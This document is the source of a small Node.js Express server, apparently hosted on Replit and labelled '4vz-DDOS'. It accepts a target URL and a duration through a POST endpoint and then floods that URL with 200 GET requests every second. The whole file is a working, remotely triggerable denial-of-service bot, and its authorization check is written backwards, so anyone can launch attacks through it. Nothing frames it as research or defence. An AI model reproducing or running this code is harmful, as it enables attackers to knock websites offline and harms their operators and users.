const express = require("express");
const request = require("request");
const bodyParser = require("body-parser");
var using = false;
const app = express();

app.use(bodyParser.json());

app.all("/", (req, res) => {
  res.send("Uptimed!")
});

app.post("/inelity", async (req, res) => {
  if (req?.headers?.Authorization == "inelity") return res.status(301).json({
    message: "Authorization Failed",
    code: 301
  });

  if (!req?.body?.timeout || !req?.body?.url) return res.status(301).json({
    message: "BODY PROBLEM",
    code: 301
  });

  if (using) return res.status(301).json({
    message: "Server Already DDOSING",
    code: 301
  });

  res.status(200).send("OK!");
  using = true;
  var lastattack = {
    success: 0,
    error: 0,
    try: 0
  }

  var options = {
    url: req?.body?.url,
    method: 'GET',
    headers: {
      'User-Agent': 'Super Agent/0.0.1',
      'Content-Type': 'application/x-www-form-urlencoded',
      'Referer': ''
    }
  }

  let attack = () => {
    console.log(`Success: ${lastattack.success} Error: ${lastattack.error} Try: ${lastattack.try}`);
    lastattack = {
      success: 0,
      error: 0,
      try: 0
    }
    for (var i = 0; i < 200; i++) {
      lastattack.try++
      request(options, function(error, response, body) {
        if (!error && response.statusCode == 200) {
          lastattack.success++
        } else {
          lastattack.error++
        }
      });
    }
  }

  var killer = setInterval(attack, 1000);
  await new Promise((res) => { setTimeout(() => { res() }, req?.body?.timeout) });
  using = false;
  clearInterval(killer);
});


app.listen(8080, () => {
  console.log("-------------4vz-DDOS-----------------");
  console.log("------------------------------------------");
  console.log("Your Server Url: " + process.env.REPL_SLUG + ".4vz2016.repl.co");
  console.log("------------------------------------------");
  console.log("-------------4vz-DDOS-----------------");
});